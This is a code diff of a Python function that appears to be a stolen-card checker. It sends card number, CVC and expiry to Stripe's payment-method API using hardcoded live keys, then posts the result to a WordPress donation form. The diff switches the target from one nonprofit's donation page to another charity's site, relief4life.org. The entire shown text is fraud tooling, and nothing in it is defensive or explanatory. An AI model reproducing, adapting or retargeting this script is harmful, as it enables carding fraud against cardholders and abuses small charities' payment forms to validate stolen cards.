@@ -29,19 +29,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = 'type=card&billing_details[name]=Kuroshio&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&key=pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9'
+	data = 'type=card&billing_details[name]=Kuroshio&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&key=pk_live_LFkOrOs32DeXWSrhVXG7JrUp002eIQUobQ'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'mauritaniancommunity-dmv-usa.org',
+	    'authority': 'relief4life.org',
 	    'accept': 'application/json, text/javascript, */*; q=0.01',
 	    'accept-language': 'en-US,en;q=0.9',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://mauritaniancommunity-dmv-usa.org',
-	    'referer': 'https://mauritaniancommunity-dmv-usa.org/membership-donations/',
+	    'origin': 'https://relief4life.org',
+	    'referer': 'https://relief4life.org/en/',
 	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -54,7 +54,7 @@ def Tele(ccx):
 	
 	data = {
 	    'action': 'wp_full_stripe_inline_donation_charge',
-	    'wpfs-form-name': 'Dmv',
+	    'wpfs-form-name': 'SalletKhairat',
 	    'wpfs-form-get-parameters': '%7B%7D',
 	    'wpfs-custom-amount': 'other',
 	    'wpfs-custom-amount-unique': '1',
@@ -64,11 +64,7 @@ def Tele(ccx):
 	    'wpfs-stripe-payment-method-id': f'{pm}',
 	}
 	
-	response = requests.post(
-	    'https://mauritaniancommunity-dmv-usa.org/wp-admin/admin-ajax.php',
-	    headers=headers,
-	    data=data,
-	)
+	response = requests.post('https://relief4life.org/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	result = response.json()['message']
 	
